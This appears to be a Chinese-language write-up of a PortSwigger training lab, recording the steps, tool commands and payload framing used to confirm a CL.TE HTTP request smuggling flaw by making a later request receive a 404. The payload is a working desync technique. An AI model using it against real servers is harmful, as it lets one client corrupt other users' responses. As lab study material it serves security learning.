---
title: "lab-confirming-cl-te-via-differential-responses"
---

# lab-confirming-cl-te-via-differential-responses

## 题面
PortSwigger: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses.
前端不支持 chunked(按 Content-Length);解 = 走私一请求使「随后的 `/` 请求」收到 404。

## 步骤
1. `range_launch launch-url /web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses --jar /tmp/cj1.json` → 实例 URL(路径已含取号,勿另调 page_read)。
2. `conn_reuse <inst>/ --cl-te '<smuggled>' --read-ms 4000` — `--cl-te` 自动组帧:
   `POST / HTTP/1.1` + `Host:` + `Content-Length: len("0\r\n\r\n"+smuggled)` + `Transfer-Encoding: chunked` + body `0\r\n\r\n<smuggled>`。
3. smuggled 用完整请求 `GET /404 HTTP/1.1\r\nX-Ignore: X\r\n\r\n`,CL = 39。
4. 前端按 CL 转发全部字节;后端按 chunked 在 `0\r\n\r\n` 结束 POST,余下字节成为该连接上的下一请求 → 后端回 404,经前端→后端连接池交给下一个打到 `/` 的请求。

## 关键点
- 前端每个响应带 `Connection: close`,同一 socket 读不到第二响应;desync 不靠客户端流水线,而靠前端→后端池里的排队 404 泄漏给后续请求。
- 走私请求不带尾部空行(不完整)同样有效:后端把它与下一请求拼成一条,`X-Ignore: X` 吞掉边界,后续 `/` 仍得 404;完整式(带 `\r\n\r\n`)更稳。

## 证据
- `conn_reuse` 对 `/` 的请求回 `HTTP/1.1 404 Not Found`(`Content-Type: application/json`,body `"Not Found"`)。
- `banner_verdict <inst>/ --jar /tmp/cj1.json` → `solved:true`,`congrats_line` = "Congratulations, you solved the lab!"。

## 工具
`range_launch` 起实例 → `conn_reuse --cl-te` 组 CL.TE 帧发次 → `banner_verdict` 判翻牌。